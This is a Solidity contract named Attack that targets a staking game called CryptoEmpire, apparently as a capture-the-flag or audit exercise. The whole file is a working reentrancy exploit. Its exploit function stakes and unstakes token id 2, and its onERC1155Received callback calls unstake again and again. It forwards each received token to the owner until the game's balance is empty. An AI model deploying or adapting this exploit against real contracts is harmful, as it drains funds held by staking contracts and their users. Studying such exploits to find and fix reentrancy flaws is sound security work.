// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {IERC1155} from "@openzeppelin/contracts/token/ERC1155/IERC1155.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

interface ICryptoEmpire {
    function stake(uint256 _nftId) external;
    function unstake(uint256 _nftId) external;
}

contract Attack is Ownable {
    IERC1155 private immutable token;
    ICryptoEmpire immutable game;

    bool private tokenTransfered;

    constructor(address _token, address _game) {
        token = IERC1155(_token);
        game = ICryptoEmpire(_game);
    }

    function exploit() external onlyOwner {
        // Stake the token
        token.setApprovalForAll(address(game), true);
        game.stake(2);
        // Unstake the token
        game.unstake(2);
    }

    function onERC1155Received(address operator, address from, uint256 id, uint256 amount, bytes calldata data)
        external
        returns (bytes4 response)
    {
        if (!tokenTransfered) {
            tokenTransfered = true;
            return this.onERC1155Received.selector;
        }
        require(msg.sender == address(token), "Wrong Call");
        token.safeTransferFrom(address(this), owner(), id, 1, "");
        uint256 gameBalance = token.balanceOf(address(game), 2);

        if (gameBalance > 0) {
            game.unstake(2);
        }

        return this.onERC1155Received.selector;
    }
}
